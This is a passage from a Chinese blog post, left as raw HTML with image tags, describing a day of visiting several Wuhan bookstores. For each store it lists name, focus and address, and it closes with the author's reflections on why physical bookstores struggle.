data-watermark-src=\"v2-d40957a9a5ddbc48e582c6e81a489851\" data-private-watermark-src=\"v2-909a713bacca0ecb105ac21e6e146950\"></p>\n<p><b>该书店基本信息如下：</b></p>\n<p><b>名称：</b>新华书店（珞喻路店）</p>\n<p><b>主营：</b>书籍类型覆盖较广，以近期出版图书、畅销书居多</p>\n<p><b>地址：</b>武汉市洪山区武珞路800附2号</p>\n<p>起初，我以为这家书店我是第一次来，后来看了看周围街道的环境，我发现，我曾来过这儿。那是2年多前的一天晚上，我因为有些事儿路过街道口，看到这家新华书店，进去逛了逛。但那个时候，这家书店里还是上世纪90年代的风格，里面显得十分朴素，书的种类也不很多，我还以为这书店要凉了呢。</p>\n<p>如今再看，书店已经修葺一新，内部弄得十分有设计感，整体显得高大上了不少。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-abfa357481be3f1c3c0c6cac9e15367a_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"watermark\" data-original-src=\"v2-abfa357481be3f1c3c0c6cac9e15367a\" data-watermark-src=\"v2-15e3b2457778a6e50e6e6e3f8f501554\" data-private-watermark-src=\"v2-740bfeadcc4402214a8155eeabaf7674\"></p>\n<p>因为肚子饿的缘故，我和阿威老师在这书店较快地浏览了一圈，虽然未做过长时间的逗留，但从书店内部环境的改造升级可以看出，新华书店也在谋求转型。</p>\n<p>在我看来，这是一件好事。谁也不知道未来的书店会是怎样，以及书店是否还会存在，但做出一些改变，摸索着前进，至少说明，有那么一批人，始终珍视着书店的价值。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-cb784b3e986a33e811e3e719ad69a6f3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"807\" data-watermark=\"watermark\" data-original-src=\"v2-cb784b3e986a33e811e3e719ad69a6f3\" data-watermark-src=\"v2-1dd74fd2ea225bed8a5f8a4d7205eda1\" data-private-watermark-src=\"v2-6142e09c05edc1449d2c9def8eb53baf\"></p>\n<h2>03 钟书阁</h2>\n<p>在群光广场7层的U你·天然调味吃罢午饭，我和阿威老师顺便到4楼的钟书阁转了转。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-fc85c9d0a65e4a9949467a9a812123c9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"867\" data-rawheight=\"648\" data-watermark=\"watermark\" data-original-src=\"v2-fc85c9d0a65e4a9949467a9a812123c9\" data-watermark-src=\"v2-a726a5b393436765d0c458c8712164ed\" data-private-watermark-src=\"v2-0b13fa22848424901ca525afdb66619f\"></p>\n<p><b>该书店基本信息如下：</b></p>\n<p><b>名称：</b>钟书阁</p>\n<p><b>主营：</b>书籍类型覆盖较广，以近期出版图书、畅销书居多</p>\n<p><b>地址：</b>武汉市洪山区珞喻路10号群光广场二期4层</p>\n<p>据我的了解，钟书阁原起源于上海，创始人叫金浩，原来是一名语文老师，后来投身民营书店行业，经过一番努力，将书店开遍了全国主要城市</p>\n<p>钟书阁的出名很大程度在于它独树一帜的设计风格，通过互联网传播效应被众多网友热捧。和很多连锁书店千篇一律的设计风格不同，钟书阁每开到一个新城市，都会将当地文化元素融入到自家书店的设计上来，这也就让全国连锁的钟书阁更能获得当地人的认同，从这一点我们不难得出这样一个结论：</p>\n<p><b>钟书阁不仅仅是一家书店，还是一座城市的文化地标了。</b></p>\n<p><img src=\"https://pic4.zhimg.com/v2-cc348c0e8f7998e1dc350c031306619d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"868\" data-rawheight=\"643\" data-watermark=\"watermark\" data-original-src=\"v2-cc348c0e8f7998e1dc350c031306619d\" data-watermark-src=\"v2-1b0ff6cdc93bd061f906c52defbb1158\" data-private-watermark-src=\"v2-f87ec99f59cb363a5ae4ce26d7395dad\"></p>\n<p>位于武汉群光广场的钟书阁，总共有3、4两层楼，连接两层楼的楼梯两旁，是排列的密密麻麻的书籍，抬头一望，镜面材质的天花板让整个空间纵深延展不少，我抬头望向天花板里的自己，仿若身处哥特式教堂一般震撼。</p>\n<p>不得不说，这里真是一个拍照打卡的好地方。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-45b49e60510e16eb9f10e0fe293759e2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"477\" data-rawheight=\"642\" data-watermark=\"watermark\" data-original-src=\"v2-45b49e60510e16eb9f10e0fe293759e2\" data-watermark-src=\"v2-1da1d740b288db7bdde9b16503bedb9e\" data-private-watermark-src=\"v2-ef5c1a8c510604427ad100926e396110\"></p>\n<h2>04 华师百草园书店</h2>\n<p>华师百草园书店在群光广场附近，那会儿我听朋友说，这家开了十年之久的书店因为一些不可抗力的原因即将闭店，于是决定过来看看，毕竟过了这个村就没那个店了。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-553141383d1060a7885cd69a6ef32587_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"800\" data-watermark=\"watermark\" data-original-src=\"v2-553141383d1060a7885cd69a6ef32587\" data-watermark-src=\"v2-9383f9f71a61386d8ba07bcf24bf77ff\" data-private-watermark-src=\"v2-bb0b53753ed2311497637c2c89f713b8\"></p>\n<p><b>该书店基本信息如下：</b></p>\n<p><b>名称：</b>百草园书店（已关闭）</p>\n<p><b>主营：</b>以人文社科类书籍为主</p>\n<p><b>地址：</b>武汉市洪山区桂元路5号教育技术装备处一号楼阳光码头</p>\n<p>一路导航，拐进一条小巷，上了一个缓坡，转弯一看，旁边立着一处指示牌——“阳光码头”。指示牌上还钉着好些木质的箭头牌，百草园书店“榜上有名”。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-21a4ee904fe05d4a950518e1a6025b35_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"648\" data-rawheight=\"864\" data-watermark=\"watermark\" data-original-src=\"v2-21a4ee904fe05d4a950518e1a6025b35\" data-watermark-src=\"v2-0304e25b817c91d7a79b9de035a330ee\" data-private-watermark-src=\"v2-a55aed9ba567f38c474c21d1260e7926\"></p>\n<p>顺着箭头望去，我和阿威老师看见不远处有个小院，院里的一家门店聚了不少人。</p>\n<p>没猜错的话，那应该就是华师百草园书店了。我们走近一看，还真是。</p>\n<p>因为快要闭店了，百草园书店正在进行着书籍一律5折售卖的活动：</p>\n<p>店外，买书的朋友排起了长队，店员们则忙着处理订单；</p>\n<p><img src=\"https://pic4.zhimg.com/v2-ae6b2258a97addbe3c8d95be2c16fc60_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"807\" data-watermark=\"watermark\" data-original-src=\"v2-ae6b2258a97addbe3c8d95be2c16fc60\" data-watermark-src=\"v2-06133ea84fe60b44be6df8e866ffe0ab\" data-private-watermark-src=\"v2-714d34c8a04f607540ff8e848391393a\"></p>\n<p>店内，书架上的书籍已经所剩无几，但依旧有不少朋友在挑选着书籍。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-1583c51b2be8b2bbc093d7e6d4dba0d2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"806\" data-watermark=\"watermark\" data-original-src=\"v2-1583c51b2be8b2bbc093d7e6d4dba0d2\" data-watermark-src=\"v2-c43fb527d2982e2236a2629eeee8cdbe\" data-private-watermark-src=\"v2-2fdd53999ac1b3d3707f62e1b3a5ef83\"></p>\n<p>五折售卖图书是很划算的，喜欢淘书的阿威老师此时又忍不住挑起书来，而我，则在书店里随便走走看看。</p>\n<p>来到书店里的一处房间，我看到有几个人在进行拍摄和采访，一问才知道，这是央视纪录频道的工作人员，他们为了制作一档有关城市与书店的节目（PS. 据说是今年8月播出），慕名来到了百草园书店。</p>\n<p>有位被采访的朋友说：</p>\n<blockquote>“多年前就光顾过这家书店，如今再来，是满满的回忆。喜欢逛书店，喜欢读纸质书，那种感觉是电子书所无法替代的。一个人、一本好书、一杯清茶、一坐便是一个下午~”</blockquote>\n<p>真是种令人驰往的状态，我想，华师百草园书店或许是众多学子，尤其是华师学子的“理想国”吧，这里虽然地方不大，也不是很好找，但确乎是一处安静阅读的好去处。</p>\n<p>可惜，这一切都要成为过去式了。</p>\n<p>……</p>\n<p><img src=\"https://pic2.zhimg.com/v2-a5bafebf78c4fd16ead715b9e39cd1e7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"807\" data-watermark=\"watermark\" data-original-src=\"v2-a5bafebf78c4fd16ead715b9e39cd1e7\" data-watermark-src=\"v2-d514dc6f2f415e741dd01e4a984cec66\" data-private-watermark-src=\"v2-3dcb74b98e98fafd311a38a0bc50d137\"></p>\n<p>约摸1个小时后，阿威老师选完了书，不意外地，又是几十本，一结账，将近1千块，顺便还送了我一本书，我看这百草园书店要闭店了，既然来了，两手空空总不太好吧，凑巧看到钱穆先生的《国史大纲》，打完折才41块，果断入手了。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-350355f75fee31157b71c7d11c2584c4_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"648\" data-rawheight=\"866\" data-watermark=\"watermark\" data-original-src=\"v2-350355f75fee31157b71c7d11c2584c4\" data-watermark-src=\"v2-d0973446c43712d3c25c753a967bb9b4\" data-private-watermark-src=\"v2-1171d06acae4717f6ce9aba9836dc4dd\"></p>\n<p>我俩从百草园书店出来的时候，依旧能看到有不少朋友前来。百草园书店老板老王一个人默默坐在离书店不远的地方，低头刷着手机，一言不发，我想，此刻的他，心里必然是不舍且难受的吧。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-16684a020f730daaa5a74c0db05f4b11_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"808\" data-watermark=\"watermark\" data-original-src=\"v2-16684a020f730daaa5a74c0db05f4b11\" data-watermark-src=\"v2-146b6fd56f587baf2f84d5bd97f75e44\" data-private-watermark-src=\"v2-f02a0f1a1e53113d521f138176ef2633\"></p>\n<p>对光顾百草园的朋友们想说的话，或许就在5月16日发布的一篇公众号推文里了吧：</p>\n<p>最后，欢迎大家来送别百草园，山高路远，我们换个江湖再见。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d664d53f4282de2a97a4030d8b9378b9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"796\" data-watermark=\"watermark\" data-original-src=\"v2-d664d53f4282de2a97a4030d8b9378b9\" data-watermark-src=\"v2-75a197699e420706819e8833211fb38d\" data-private-watermark-src=\"v2-f9c3da52cfbdd912c1fd5ae1c86eacd6\"></p>\n<h2>05 集成古旧书社</h2>\n<p>从华师百草园出来，我和阿威老师把买来的书打包后交给了快递，然后就接着去逛下一个书店了。</p>\n<p>这是一家位于武汉大学附近的旧书店：</p>\n<p><b>集成古旧书社。</b></p>\n<p><img src=\"https://pic1.zhimg.com/v2-24eab5e18bb851e68c7e5b4dc7e48281_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"866\" data-rawheight=\"649\" data-watermark=\"watermark\" data-original-src=\"v2-24eab5e18bb851e68c7e5b4dc7e48281\" data-watermark-src=\"v2-97958ef4b12e9f8e0bd4819495aad141\" data-private-watermark-src=\"v2-2781ee56b8f69583f56b27fe2c76a11a\"></p>\n<p><b>该书店基本信息如下：</b></p>\n<p><b>名称：</b>集成古旧书社</p>\n<p><b>主营：</b>旧书，以人文社科类书籍为主，自然科学类书籍也有涉及</p>\n<p><b>地址：</b>武汉市洪山区珞珈山街办事处珞狮北路四眼井65号</p>\n<p>集成古旧书社的老板姓吴，今年70多岁了，就叫吴爷爷吧，之前我曾独自拜访过这里，我了解到，这家书店开了30多年了，如今他依旧坚守在这旧书的世界里。</p>\n<p>我和阿威老师进书店的时候，吴爷爷正坐在桌上整理旧书。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-152010903311d1231b96820325b02fc3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"807\" data-watermark=\"watermark\" data-original-src=\"v2-152010903311d1231b96820325b02fc3\" data-watermark-src=\"v2-2310bb2dc78cb3b0634d003acc084a63\" data-private-watermark-src=\"v2-fd2b2f0817f5cd13d8abb2cd822637d6\"></p>\n<p>书店里安安静静的，除了吴爷爷，就我和阿威老师两人。集成古旧书社与我之前见过的旧书店在空间上相较宽敞了许多，内部的布局显得颇为整齐，书架虽然上了年纪，但不同种类的书籍被分得清楚，社科是社科、经济是经济、文献是文献、考研是考研……</p>\n<p>看到这样分类清晰的旧书店布局，阿威老师对我说：</p>\n<p>“这位旧书店的老板一定对书籍有着自己的理解，从这种布局、选书的方向、内容上就能很明显地感受到。”</p>\n<p>我点点头，表示认同。</p>\n<p>或许是因为今天书淘得有点多，逛了一圈下来，阿威老师就挑了几本书，无一例外，多是关于社会学的。</p>\n<p>我问他，你为啥对社会学这么感兴趣？</p>\n<p>阿威老师笑笑，对我说：</p>\n<blockquote>“社会学是系统研究社会行为与人类群体的学科，简单来说，它的研究主题是人。我这么些年在社会上经历了不少事儿，对人本身很感兴趣，因而想花几年的时间较为系统地学习社会学，而旧书店里则恰好有许多与社会学有关的宝贵文献，这也是我为啥喜欢在旧书店淘书的理由。”</blockquote>\n<p>果真，专业人士就是不一样，看问题的角度也这么专业~</p>\n<p>把书结了账，和吴爷爷道了别，我们从书店出来，已经是下午15点半。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-fb243bfb478cad219f4993063b57b217_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"806\" data-watermark=\"watermark\" data-original-src=\"v2-fb243bfb478cad219f4993063b57b217\" data-watermark-src=\"v2-f6af30f97f8c3dcc6e6f170b94e3d947\" data-private-watermark-src=\"v2-08472c5a2853939aa5ab4e9704b4fe94\"></p>\n<p>我回头看向集成古旧书社的老式卷帘大门，再看看不远处的川流不息的街道，新旧建筑的交替，在这里，似乎有着某种断续的割裂，这让我不禁想起之前一位得到同学@束航在昆明 给我的留言：</p>\n<blockquote>城市的记忆，还有多少能够保留，就像与这个时代渐行渐远的旧书店，或终将消失殆尽。我时常会想，是不是应该把这些带有时代印记的东西记录下来，它们可能对许多人来说价值不大但并非没有意义。</blockquote>\n<p>我们担心自己某天也会泯于人海，就像这些被许多人抛弃或遗忘的旧物，我们用什么样的态度对待历史，将来的人很有可能就会用什么呀的态度去对待老去的我们。</p>\n<p>给历史的痕迹一点机会，就是给我们的未来一点机会。</p>\n<p>讲真，这段话，写的太好了，全盘引用之~</p>\n<p><img src=\"https://pic1.zhimg.com/v2-89968c994c6553d2c5aaed19ad7317a5_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"809\" data-watermark=\"watermark\" data-original-src=\"v2-89968c994c6553d2c5aaed19ad7317a5\" data-watermark-src=\"v2-05abcdcea15b480088dcbd1d50421c62\" data-private-watermark-src=\"v2-70926240b6fe6fa9828c25ffb3c0f422\"></p>\n<h2>06 境自在书店</h2>\n<p>从集成古旧书社出来后，阿威老师跟我说：</p>\n<p>“下一站要不去境自在书店吧，我之前去过一次，感觉还不错。”</p>\n<p>“境自在？”</p>\n<p>听这名字，我有些陌生，也有些好奇。陌生是因为这家书店我头一次听说，好奇则是因为，这家书店的名字听起来有一种庄周的隐逸气质在里头，有种大隐隐于市的感觉，这勾起了我拜访这家书店的欲望。</p>\n<p>我答曰：</p>\n<p><b>“OK，咱们就去这家境自在吧。”</b></p>\n<p><img src=\"https://pic3.zhimg.com/v2-1c3d5b73cacc1e4d45805d76238fd397_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"798\" data-watermark=\"watermark\" data-original-src=\"v2-1c3d5b73cacc1e4d45805d76238fd397\" data-watermark-src=\"v2-a23c1fafb0cde84f43156b703410487c\" data-private-watermark-src=\"v2-a8989b1475fd58c944cf1942ad2854e1\"></p>\n<p><b>该书店基本信息如下：</b></p>\n<p><b>名称：</b>境自在书店</p>\n<p><b>主营：</b>以人文社科类书籍为主，包括近期出版的新书、畅销书等</p>\n<p><b>地址：</b>武汉市江汉区解放大道557号中山广场写字楼19层25室</p>\n<p>我和阿威老师转了两趟公交，从武昌经过长江大桥到汉阳，再从汉阳经过江汉桥到了汉口，穿过老汉口的狭小街巷，来到了中山公园。</p>\n<p>而境自在书店，就在中山公园旁边。</p>\n<p>我没有想到的是，境自在书店在一栋写字楼的19层，一般来说，书店不都是开在一楼、二楼吗？居然还有开在19层的书店？</p>\n<p>坐着电梯到了19层，阿威老师凭着印象带我找到了这家书店。</p>\n<p>整个书店分两间房，境自在书店的老板大石头说，这家书店已经开了7年了，其中一间房是用来售卖书籍和开办读书分享会的，一间房则是用来专门安静阅读的。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-c17a1cac5a5de053f6a39ee7ab569ef8_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"807\" data-watermark=\"watermark\" data-original-src=\"v2-c17a1cac5a5de053f6a39ee7ab569ef8\" data-watermark-src=\"v2-617d163f06f4b4f6be57f5ee90832e7f\" data-private-watermark-src=\"v2-e811b1cfca5562f9025609e4d37f14ef\"></p>\n<p>我环顾书店四周，发现尽管面积不大，估摸不到五十平米的空间，但和书店有关的元素可一点没少：</p>\n<p>摆满书的书架、偶尔可见的几张专辑碟片、一张长桌、两张小沙发、以及两个简单分隔的小间，还有墙上的那幅用隶书写成的“境自在”，让整个书店显得人文气息十足。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-90083dd11076942f0ebe4191818da0e2_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"806\" data-watermark=\"watermark\" data-original-src=\"v2-90083dd11076942f0ebe4191818da0e2\" data-watermark-src=\"v2-b5fcc011fa7d956439097e43a33f9de3\" data-private-watermark-src=\"v2-9d7ac7319aae96d56d1e13946260895f\"></p>\n<p>店内的装饰物并不多，若说有，那非整面墙上挂着的大大小小黑板上的手写标语莫属，还有那些贴满书柜门的手写推荐，不管是手写标语，还是手写推荐，字体都很漂亮，内容也很用心，我大致浏览了下，能看出老板大石头是个心思认真细腻的人，而且脑洞也很大，比如说这句：</p>\n<p><b>我希望书（店）就像生活中的一碗“热干面”，好吃实在，虽不奢华，却是不可或缺的食粮。</b></p>\n<p>这比喻，够武汉，够接地气，蛮扎实，我给满分~</p>\n<p><img src=\"https://pic1.zhimg.com/v2-a45d5e2bef187a7d5c700157975fc0f1_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"watermark\" data-original-src=\"v2-a45d5e2bef187a7d5c700157975fc0f1\" data-watermark-src=\"v2-08fde7843942e55a0fe452fd473da1bc\" data-private-watermark-src=\"v2-81fdce07c057c86a41e382f4b62701c7\"></p>\n<p>因为时间关系，加之石头哥比较忙，我和阿威老师在境自在待了一会儿，就准备离开了。石头哥把我们送到电梯口，离开前，我问石头哥：</p>\n<p>“7年了，境自在书店能坚持到现在，除了情怀，还有什么？”</p>\n<p>石头哥回答说：</p>\n<p><b>“书店不是光靠情怀能存活下来的，需要思考经营啊。”</b></p>\n<p>是啊，有情怀当然没错，但做书店，本质上也是一门生意，想要活下来，当然得有属于自己的经营模式，我想，境自在从2014年坚持到现在，必然是形成了自己的书店经营模式的，我欣赏这样的书店人，祝石头哥的境自在书店发展得越来越自在~</p>\n<p><img src=\"https://pic3.zhimg.com/v2-6896095c5f05f99d2a676c1cf02ae32b_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"watermark\" data-original-src=\"v2-6896095c5f05f99d2a676c1cf02ae32b\" data-watermark-src=\"v2-89e9e4d6c5904c296c0e5901fed53d8e\" data-private-watermark-src=\"v2-09533a68c4f6b80f650fa6559cc907fa\"></p>\n<h2>07 鹅社书店</h2>\n<p>从境自在书店出来，已经是下午17点半，我和阿威老师两人已经有了些许倦意，加了让接下来的行程舒服些，我们叫了辆网约车。</p>\n<p>天色渐晚，汽车穿过汉口吉庆街夜市，经过咸安坊，在鄱阳街与青岛路的交汇口停下。这两条路的交汇口，有一处上世纪留存下来的老建筑：</p>\n<p>平和打包厂旧址。</p>\n<p>而鹅社书店，就在这里。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-abe7d47eb147fd5502f6d59103a6c4e9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"807\" data-watermark=\"watermark\" data-original-src=\"v2-abe7d47eb147fd5502f6d59103a6c4e9\" data-watermark-src=\"v2-3d359363a78347afd6948aba6730360e\" data-private-watermark-src=\"v2-ed838f75cd7c239db018bc63352cc70d\"></p>\n<p><b>该书店基本信息如下：</b></p>\n<p><b>名称：</b>鹅社书店艺术馆</p>\n<p><b>主营：</b>以人文社科类书籍为主，包括近期出版的新书、经典等。</p>\n<p><b>地址：</b>武汉市江岸区青岛路10号多牛世界B座1楼</p>\n<p>进入鹅社书店，首先迎接你的并不是书，而是各类文创产品，继续往里走，才到了售卖书籍的区域。</p>\n<p>鹅社书店用来摆放书籍的书架是木质的，但颜色上采取了青蓝色与白色这两种色调，两相对比映衬，不禁让人想到天鹅游于湖水之上的场景，给人以无限想象空间，而且也十分贴合鹅社书店中“鹅”这个主题，给整个书店塑造了一种沉静唯美的感觉。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-17f1862f1f2be193bdaf07adb1280681_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"809\" data-watermark=\"watermark\" data-original-src=\"v2-17f1862f1f2be193bdaf07adb1280681\" data-watermark-src=\"v2-6a45f25930b2be0acc7564b859957826\" data-private-watermark-src=\"v2-9516faefce14ecccb9a0120a0564de22\"></p>\n<p>除了卖书，鹅社书店还有一块专门用来进行艺术作品展示的区域，我并非艺术科班出身，对这些作品很难看得深入，但作为一个对艺术爱好者来说，我知道这些作品是作者用心创作的，这感觉不是用理性推导出来的，而是感性中催生的产物。</p>\n<p>……</p>\n<p><img src=\"https://pic2.zhimg.com/v2-3ed4bd0823452c9ba1f3c478a45fcd97_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"798\" data-watermark=\"watermark\" data-original-src=\"v2-3ed4bd0823452c9ba1f3c478a45fcd97\" data-watermark-src=\"v2-1456f689e14f4a9fd7d4d49617021284\" data-private-watermark-src=\"v2-11bf1d98130828bfc18df8b65df41147\"></p>\n<p>看我有些累了，阿威老师让我坐着休息会儿，他去接另一位在武汉的朋友。</p>\n<p>不一会儿，他们回来了，阿威老师旁边，多了一位小姐姐。</p>\n<p>小姐姐在市档案馆工作，名字里有个“倩”字，算是我的学姐，下文就以小倩学姐代称吧。</p>\n<p>据说，她是因为某次书店的活动与阿威老师结识，这次阿威老师来武汉，正好见面交流交流。</p>\n<p>甚好，又遇到了一个爱书之人，互联网把志趣相投的人联系到了一起。 </p>\n<h2>08 西西弗书店（江汉路店）</h2>\n<p>夜幕降临，小倩学姐请我和阿威老师吃了顿饭，饭后，我们在江汉路逛逛，既能聊聊天，又当消食了。</p>\n<p>其实我盘算着逛到江汉路地铁站，今天的行程就算告一段落了，结果走到M购物中心，我们又发现一家书店：</p>\n<p>西西弗书店（江汉路店）。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-1edf6fd359cac42632e5ae8e47029582_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"808\" data-watermark=\"watermark\" data-original-src=\"v2-1edf6fd359cac42632e5ae8e47029582\" data-watermark-src=\"v2-ba1c8d69d2eafd7193f6f9bcd75b931d\" data-private-watermark-src=\"v2-41a30c8c39d6a8a7aaf439cd7a0e6ba8\"></p>\n<p><b>该书店基本信息如下：</b></p>\n<p><b>名称：</b>西西弗书店</p>\n<p><b>主营：</b>以人文社科类书籍为主，包括当季出版的新书、畅销书等。</p>\n<p><b>地址：</b>武汉市江汉区187号M购物中心B1层</p>\n<p>既然碰到了，那就进去逛逛吧。</p>\n<p>我曾去过武汉天地、六渡桥凯德广场的西西弗书店，其装修设计都差不多，不意外的，这家江汉路的西西弗也是如此，后来查了相关资料才晓得，全国的西西弗书店长得都差不多……</p>\n<p>虽然不像钟书阁那样在设计上风格迥异，但西西弗的英伦风格店门、复古风的橱窗摆设以及店内的标志缎带等，倒也十分耐看，也十分上镜。</p>\n<p>作为专业的书店培训师，阿威老师跟我和小倩学姐聊了聊西西弗书店的盈利模式：</p>\n<blockquote>别看西西弗书店表面上显得挺文艺，若论盈利模式，可是挺硬核的。<br><br>一家书店，想真正赚到钱，光谈情怀是没啥用的，于是，西西弗书店将零售业的玩法应用到了图书销售中，就像沃尔玛一样，将图书当成零售商品一样卖。<br><br><b>西西弗会搭建对每个门店客户群体进行分析的专业后台，根据他们的阅读习惯、消费能力等进行模型分析、用户画像，并对书籍进行标签化管理，反应到门店里书籍的摆放逻辑，就是以A、B、C为顺序排列的权重比例，这样的话，就能够帮助那些在阅读方面缺乏自己兴趣和判断力的顾客做选择，进而提高书籍卖出的效率。</b>\n</blockquote>\n<p><img src=\"https://pic3.zhimg.com/v2-d1c5e38f96e4e466064862d34e441741_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"807\" data-watermark=\"watermark\" data-original-src=\"v2-d1c5e38f96e4e466064862d34e441741\" data-watermark-src=\"v2-b3bfcdd62ec8614c69223a1552b7682f\" data-private-watermark-src=\"v2-f15f7794b2826136aa5a209f633dc6da\"></p>\n<p>听阿威老师讲完，我才忽地意识到：</p>\n<p>过去自己对书店行业的理解其实是颇为浅表的，只是单纯地看书店的外在设计，拍拍照、打打卡而已，但事实上，与“情怀”二字联系紧密的书店，本质上也是一种商业形态，作为一个爱逛书店的人，如果不能从更深层次的角度去理解书店，那我想，这种爱，实在是有些立不稳脚跟。</p>\n<p>……</p>\n<p>从西西弗书店出来，已是晚上21点多，江汉路上人依旧熙熙攘攘，而我和阿威老师、小倩学姐到了说再见的时候了。</p>\n<p>还会有机会再聚吧~！那天的逛书店经历着实让我难忘，因为互联网，我和机会和来自天南海北、素昧平生但志趣相投的人聚在一起，聊天交流，人间值得~</p>\n<p><img src=\"https://pic3.zhimg.com/v2-4d8b94fc71b1e1ae9256ada1a38a0d39_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"810\" data-watermark=\"watermark\" data-original-src=\"v2-4d8b94fc71b1e1ae9256ada1a38a0d39\" data-watermark-src=\"v2-a8faaa91ebb7f7ba5469abe55808a4b8\" data-private-watermark-src=\"v2-f3a822f8939c81014e8e213fbafc34d4\"></p>\n<h2>09 关于书店，我的一点思考</h2>\n<p>带大家聊了聊我和阿威老师逛过的8家书店，再聊聊我对书店的一点思考吧。</p>\n<p>下面这些话，是我去年9月份再逛中南路帝斯曼的时见鹿书店后写下的，反映了我对书店的一点思考，这里分享给大家：</p>\n<blockquote>今天工作弄完后，决定出门走走。租的房子附近有一家时见鹿书店，文艺范儿的，挺符合我胃口。本来漫无目的的散步变成了不由自主地去了书店。<br><br>书店很安静，诺大的空间里除了书柜和书柜上的书以外，你见不到啥密集的事物，人么？可以用三三两两来形容，我在装修考究、冷气不断的时见鹿里面逛了几圈，越发感觉奢侈，并且有一种隐隐的担忧——这家书店，还能活多久？<br><br>这些年我去过的书店不算少了，小时候常去那种堆满教辅资料的书店，包括新华书店，这种书店也卖其他书，但有意思的是，教辅似乎永远都崭新发亮，而旁的，则往往布满了灰尘。<br><br>高考后，我去了趟深圳，在华侨城哪里，我邂逅了第一家我觉得真正可以称之为“书店”的地方——旧天堂书店，就是那种很文艺范儿、很小众、又很有情调的书店。很多人都知道，线下书店里买书挺贵，但我比较感性，冲着这书店带给我的感觉，我没怎么犹豫花了一百块大洋入手了两本书，一本许倬云先生的《说中国》，一本诺奖经济学得主的文章集子。我以为我这样已经很不错了，谁知我旁边一老兄，拿了一车书来，一算账，一千多，我跪服！而且，我从他与店员的交谈中得知，这不是一回两回了，而是——常常。<br><br>这不叫书虫，这尼玛可以叫书痴了。<br><br>大学在武汉，或自己，或与二三好友，去过武汉各种有意思的书店，像昙华林的拾光书局、武锅附近的403艺术中心（暂时关闭）、楚河汉街的文华书局（已关闭）、汉阳龙阳大道及汉口江汉路的物外书店（江汉路店已关闭）、汉口儿童医院旁的卓尔书店、武广里的弘道书店、予果书店、汉口武汉天地及六渡桥凯德广场的西西弗书店，在凯德广场的西西弗，我和好友阿亮还亲眼见到了北大教授薛兆丰老师，并合照买书签了名，害，毕竟是一位靠卖一份经济学课就收获了超30万学员的男人啊……<br><br>谈回书店。<br><br>这些书店看多了，会有些审美疲劳，所谓的文艺范儿看多了也会觉得平常，但有一种隐隐的说不出来氛围萦绕在这类风格的书店里，让我对其又保持这探索了解的欲望。<br><br>2020年疫情，好友阿智给我发来消息说，汉街那家文华书城倒闭了……<br><br>我无言长久。<br><br>对于一些突发的、显得不怎么好的事情，我的第一反应常常是内心先开始遗憾，而表面上貌似很平静，渐渐的，心形合一，逐渐开始陷入一种纠结的迷惘中，这迷惘想来有些悲怆和天真，但却是我真实之感，何必隐藏？<br><br>事实上，很多精致的书店，往往都是在亏本运营的，现在买书，我想大多数人都转移阵地到了网上，毕竟，某东某当有满100减50、某宝有9.9包邮……是的，在书店买书的人不是没有，但相比从前，已经